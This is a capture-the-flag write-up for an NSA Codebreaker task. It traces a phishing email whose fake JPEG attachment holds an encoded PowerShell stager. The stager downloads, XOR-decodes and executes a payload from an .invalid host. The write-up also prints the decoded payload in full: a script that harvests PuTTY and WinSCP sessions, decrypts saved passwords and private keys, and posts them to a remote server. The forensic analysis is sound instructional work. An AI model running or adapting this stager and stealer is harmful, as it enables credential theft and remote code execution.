# Task03 - Email Analysis

**Task Instructions**:

With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don't remember anything particularly weird from earlier, but it was a few weeks back, so they're not sure. OOPS has provided a subset of the user's inbox from the day of the communication.

Identify the message ID of the malicious email and the targeted server.

* [User's Emails]

## Writeup

In a realistic environment, I would advise to never blatantly open the emails on a baremetal workstation. Instead, this is the point where we should spin up a virtual machine tailored for malware analysis. This will protect us from accidentally running or downloading some malware. However, given that this is a CTF you *should* be fine to do so and observe the behavior of the emails. 

With email analysis, simply viewing the emails with a typical .eml viewer or browser will not show us the email header and any other hidden data. So, I decided to check them out in sublime text, as well as using a typical .eml viewer that comes default with Windows 10. It is important to get the view of what the user saw, but more so what we can find by taking a closer look.

### To demonstrate
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/task03eml.gif">

Going through each of these emails, one definitely stood out, and it was message_21. The others would be able to load and display the attached image/jpeg files; however this one wouldn't. Each email's attachments are also base64 encoded, which is pretty typical of email data, but it also leaves an attack vector to be exploited. Simply editing the eml header could hide a malicious script that can be base64 encoded as well. Trying to view this picture that won't load could potentially run a malicious script.

### User View of message_21
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/email21.jpg">

### Sublime Text View of message_21
```
--===============8244490006239525902==
Content-Type: image/jpeg
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="puppy.jpg"
MIME-Version: 1.0

cG93ZXJzaGVsbCAtbm9wIC1ub25pIC13IEhpZGRlbiAtZW5jIEpBQmlBSGtBZEFCbEFITUFJQUE5
QUNBQUtBQk9BR1VBZHdBdEFFOEFZZ0JxQUdVQVl3QjBBQ0FBVGdCbEFIUUFMZ0JYQUdVQVlnQkRB
R3dBYVFCbEFHNEFkQUFwQUM0QVJBQnZBSGNBYmdCc0FHOEFZUUJrQUVRQVlRQjBBR0VBS0FBbkFH
Z0FkQUIwQUhBQU9nQXZBQzhBZWdCa0FHWUFid0IxQUM0QWFRQnVBSFlBWVFCc0FHa0FaQUF2QUdN
QWJ3QnRBSEFBZFFCMEFHVUFjZ0FuQUNrQUNnQUtBQ1FBY0FCeUFHVUFkZ0FnQUQwQUlBQmJBR0lB
ZVFCMEFHVUFYUUFnQURVQU5nQUtBQW9BSkFCa0FHVUFZd0FnQUQwQUlBQWtBQ2dBWmdCdkFISUFJ
QUFvQUNRQWFRQWdBRDBBSUFBd0FEc0FJQUFrQUdrQUlBQXRBR3dBZEFBZ0FDUUFZZ0I1QUhRQVpR
QnpBQzRBYkFCbEFHNEFad0IwQUdnQU93QWdBQ1FBYVFBckFDc0FLUUFnQUhzQUNnQWdBQ0FBSUFB
Z0FDUUFjQUJ5QUdVQWRnQWdBRDBBSUFBa0FHSUFlUUIwQUdVQWN3QmJBQ1FBYVFCZEFDQUFMUUJp
QUhnQWJ3QnlBQ0FBSkFCd0FISUFaUUIyQUFvQUlBQWdBQ0FBSUFBa0FIQUFjZ0JsQUhZQUNnQjlB
Q2tBQ2dBS0FHa0FaUUI0QUNnQVd3QlRBSGtBY3dCMEFHVUFiUUF1QUZRQVpRQjRBSFFBTGdCRkFH
NEFZd0J2QUdRQWFRQnVBR2NBWFFBNkFEb0FWUUJVQUVZQU9BQXVBRWNBWlFCMEFGTUFkQUJ5QUdr
QWJnQm5BQ2dBSkFCa0FHVUFZd0FwQUNrQUNnQT0=

--===============8244490006239525902==--
```

To further investigate this suspicious jpg file, we can decode base64 very easily. I decided to use [CyberChef]. Simply copy and paste the message and select the *from base64* option and we have the first part of a script:
``` powershell
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AegBkAGYAbwB1AC4AaQBuAHYAYQBsAGkAZAAvAGMAbwBtAHAAdQB0AGUAcgAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADUANgAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
```
One more time with the second portion and we find:
``` powershell
$bytes = (New-Object Net.WebClient).DownloadData('http://zdfou.invalid/computer')

$prev = [byte] 56

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```

We've found a malicious powershell script that was hidden as *puppy.jpg*. The first line is what encodes the second portion, which is the actual script being ran from byrd.frank's machine. As we can see, it also confirms that some more stuff has been downloaded from the shady URI we found in task02. The pcap from task01 will prove to come in handy once again as we can view the downloaded data. 

But first, a breakdown of this script: \
It starts by declaring a $bytes variable that will download the data. Then it stores it in $prev and once more in $dec by deobfuscating the incoming bytes, looping through the $prev array, -bxor'ing each byte. The iex stands for *invoke expression* in powershell, meaning it actually runs whatever the deobfuscated data is, which we can assume is more malware. Luckily, this a very poor implementation of crypto, and we can use the script to decode this data and read the downloaded data.

Referring to the pcap from task01, we can pull this data by finding the traffic associated with *http://zdfou.invalid/computer*.

### Pulling the data from the pcap
<img src="https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/zdfouGet.gif">

We can then modify the script to *not* invoke the expression, but instead spit out the deobfuscated data into a new .txt file. Simply provide the path to the downloaded data from pcap in the first line, and specify an outfile for the new text.

``` powershell
$bytes = (New-Object Net.WebClient).DownloadData('C:\Users\Colton\Desktop\nsaCodebreaker\task01\zdfouGet.bin')

$prev = [byte] 56

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

([System.Text.Encoding]::UTF8.GetString($dec)) | Out-File C:\Users\Colton\Desktop\nsaCodebreaker\task03\zdfou.txt
```
Taking a look at our outfile, we can see the downloaded script, which is definitely doing some scraping of the host machine and sending the data to another shady URI.

### zdfou.txt
``` powershell
$global:log = ""

function Write-Log($out) {
  $global:log += $out + "`n"
}

function Invoke-SessionGopher {
  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650

  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"

  
  Write-Log "Digging on $(Hostname)..."

  # Aggregate all user hives in HKEY_USERS into a variable
  $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

  # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
  foreach($Hive in $UserHives) {

    # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information. 
    $UserObject = New-Object PSObject

    $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
    $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
    $ArrayOfPPKFiles = New-Object System.Collections.ArrayList

    $objUser = (GetMappedSID)
    $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)

    $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value

    # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
    $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
    $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"

    if (Test-Path $WinSCPPath) {

      # Aggregates all saved sessions from that user's WinSCP client
      $AllWinSCPSessions = Get-ChildItem $WinSCPPath

      (ProcessWinSCPLocal $AllWinSCPSessions)

    } # If (Test-Path WinSCPPath)
    
    if (Test-Path $PuTTYPath) {

      # Store .ppk files
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList
      
      # Aggregates all saved sessions from that user's PuTTY client
      $AllPuTTYSessions = Get-ChildItem $PuTTYPath

      (ProcessPuTTYLocal $AllPuTTYSessions)
      
      (ProcessPPKFile $PPKExtensionFilesINodes)

    } # If (Test-Path PuTTYPath)

  } # For each Hive in UserHives
    
  Write-Host "Final log:"
  $global:log

} # Invoke-SessionGopher

####################################################################################
####################################################################################
## Registry Querying Helper Functions
####################################################################################
####################################################################################

# Maps the SID from HKEY_USERS to a username through the HKEY_LOCAL_MACHINE hive
function GetMappedSID {

  # If getting SID from remote computer
  if ($iL -or $Target -or $AllDomain) {
    # Get the username for SID we discovered has saved sessions
    $SIDPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
    $Value = "ProfileImagePath"

    return (Invoke-WmiMethod -ComputerName $RemoteComputer -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$SIDPath,$Value @optionalCreds).sValue
  # Else, get local SIDs
  } else {
    # Converts user SID in HKEY_USERS to username
    $SID = (Split-Path $Hive.Name -Leaf)
    $objSID = New-Object System.Security.Principal.SecurityIdentifier("$SID")
    return $objSID.Translate( [System.Security.Principal.NTAccount])
  }

}


####################################################################################
####################################################################################
## File Processing Helper Functions
####################################################################################
####################################################################################

function ProcessThoroughLocal($AllDrives) {
  
  foreach ($Drive in $AllDrives) {
    # If the drive holds a filesystem
    if ($Drive.Provider.Name -eq "FileSystem") {
      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
          ".rdp" {[void]$RDPExtensionFilesINodes.Add($Dir)}
          ".sdtid" {[void]$sdtidExtensionFilesINodes.Add($Dir)}
        }
      }
    }
  }

}


function ProcessPuTTYLocal($AllPuTTYSessions) {
  
  # For each PuTTY saved session, extract the information we want 
  foreach($Session in $AllPuTTYSessions) {

    $PuTTYSessionObject = "" | Select-Object -Property Source,Session,Hostname,Keyfile

    $PuTTYSessionObject.Source = $Source
    $PuTTYSessionObject.Session = (Split-Path $Session -Leaf)
    $PuTTYSessionObject.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $PuTTYSessionObject.Keyfile = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $Session) -Name "PublicKeyFile" -ErrorAction SilentlyContinue).PublicKeyFile)

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfPuTTYSessions.Add($PuTTYSessionObject)
    
    # Grab keyfile inode and add it to the array if it's a ppk
    $Dirs = Get-ChildItem $PuTTYSessionObject.Keyfile -Recurse -ErrorAction SilentlyContinue
      foreach ($Dir in $Dirs) {
        Switch ($Dir.Extension) {
          ".ppk" {[void]$PPKExtensionFilesINodes.Add($Dir)}
        }
      }
  }

  if ($o) {
    $ArrayOfPuTTYSessions | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY.csv") -NoTypeInformation
  } else {
    Write-Log "PuTTY Sessions"
    Write-Log ($ArrayOfPuTTYSessions | Format-List | Out-String)
  }

  # Add the array of PuTTY session objects to UserObject
  $UserObject | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $ArrayOfPuTTYSessions

} # ProcessPuTTYLocal

function ProcessWinSCPLocal($AllWinSCPSessions) {
  
  # For each WinSCP saved session, extract the information we want
  foreach($Session in $AllWinSCPSessions) {

    $PathToWinSCPSession = "Microsoft.PowerShell.Core\Registry::" + $Session

    $WinSCPSessionObject = "" | Select-Object -Property Source,Session,Hostname,Username,Password

    $WinSCPSessionObject.Source = $Source
    $WinSCPSessionObject.Session = (Split-Path $Session -Leaf)
    $WinSCPSessionObject.Hostname = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
    $WinSCPSessionObject.Username = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Username" -ErrorAction SilentlyContinue).Username)
    $WinSCPSessionObject.Password = ((Get-ItemProperty -Path $PathToWinSCPSession -Name "Password" -ErrorAction SilentlyContinue).Password)

    if ($WinSCPSessionObject.Password) {
      $MasterPassUsed = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)

      # If the user is not using a master password, we can crack it:
      if (!$MasterPassUsed) {
          $WinSCPSessionObject.Password = (DecryptWinSCPPassword $WinSCPSessionObject.Hostname $WinSCPSessionObject.Username $WinSCPSessionObject.Password)
      # Else, the user is using a master password. We can't retrieve plaintext credentials for it.
      } else {
          $WinSCPSessionObject.Password = "Saved in session, but master password prevents plaintext recovery"
      }
    }

    # ArrayList.Add() by default prints the index to which it adds the element. Casting to [void] silences this.
    [void]$ArrayOfWinSCPSessions.Add($WinSCPSessionObject)

  } # For each Session in AllWinSCPSessions

  if ($o) {
    $ArrayOfWinSCPSessions | Export-CSV -Append -Path ($OutputDirectory + "\WinSCP.csv") -NoTypeInformation
  } else {
    Write-Log "WinSCP Sessions"
    Write-Log ($ArrayOfWinSCPSessions | Format-List | Out-String)
  }

  # Add the array of WinSCP session objects to the target user object
  $UserObject | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $ArrayOfWinSCPSessions

} # ProcessWinSCPLocal


function ProcessPPKFile($PPKExtensionFilesINodes) {

  # Extracting the filepath from the i-node information stored in PPKExtensionFilesINodes
  foreach ($Path in $PPKExtensionFilesINodes.VersionInfo.FileName) {

    # Private Key Encryption property identifies whether the private key in this file is encrypted or if it can be used as is
    $PPKFileObject = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"

    $PPKFileObject."Source" = (Hostname)

    # The next several lines use regex pattern matching to store relevant info from the .ppk file into our object
    $PPKFileObject."Path" = $Path

    $PPKFileObject."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
    $NumberOfPrivateKeyLines = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $PPKFileObject."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$NumberOfPrivateKeyLines).Context.PostContext -Join "" } catch {}
    $PPKFileObject."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}

    # Add the object we just created to the array of .ppk file objects
    [void]$ArrayOfPPKFiles.Add($PPKFileObject)

  }

  if ($ArrayOfPPKFiles.count -gt 0) {

    $UserObject | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $ArrayOfPPKFiles

    if ($o) {
      $ArrayOfPPKFiles | Select-Object * | Export-CSV -Append -Path ($OutputDirectory + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Log "PuTTY Private Key Files (.ppk)"
      Write-Log ($ArrayOfPPKFiles | Select-Object * | Format-List | Out-String)
    }

  }

} # Process PPK File


####################################################################################
####################################################################################
## WinSCP Deobfuscation Helper Functions
####################################################################################
####################################################################################

function DecryptNextCharacterWinSCP($remainingPass) {

  # Creates an object with flag and remainingPass properties
  $flagAndPass = "" | Select-Object -Property flag,remainingPass

  # Shift left 4 bits equivalent for backwards compatibility with older PowerShell versions
  $firstval = ("0123456789ABCDEF".indexOf($remainingPass[0]) * 16)
  $secondval = "0123456789ABCDEF".indexOf($remainingPass[1])

  $Added = $firstval + $secondval

  $decryptedResult = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256

  $flagAndPass.flag = $decryptedResult
  $flagAndPass.remainingPass = $remainingPass.Substring(2)

  return $flagAndPass

}

function DecryptWinSCPPassword($SessionHostname, $SessionUsername, $Password) {

  $CheckFlag = 255
  $Magic = 163

  $len = 0
  $key =  $SessionHostname + $SessionUsername
  $values = DecryptNextCharacterWinSCP($Password)

  $storedFlag = $values.flag 

  if ($values.flag -eq $CheckFlag) {
    $values.remainingPass = $values.remainingPass.Substring(2)
    $values = DecryptNextCharacterWinSCP($values.remainingPass)
  }

  $len = $values.flag

  $values = DecryptNextCharacterWinSCP($values.remainingPass)
  $values.remainingPass = $values.remainingPass.Substring(($values.flag * 2))

  $finalOutput = ""
  for ($i=0; $i -lt $len; $i++) {
    $values = (DecryptNextCharacterWinSCP($values.remainingPass))
    $finalOutput += [char]$values.flag
  }

  if ($storedFlag -eq $CheckFlag) {
    return $finalOutput.Substring($key.length)
  }

  return $finalOutput

}


Invoke-SessionGopher

Start-Sleep 86400

Invoke-WebRequest -uri http://xqhyg.invalid:8080 -Method Post -Body $global:log
```

[User's Emails]: https://github.com/colton-gabertan/NSACodeBreaker2021/blob/task03/emails.zip
[CyberChef]: https://gchq.github.io/CyberChef/
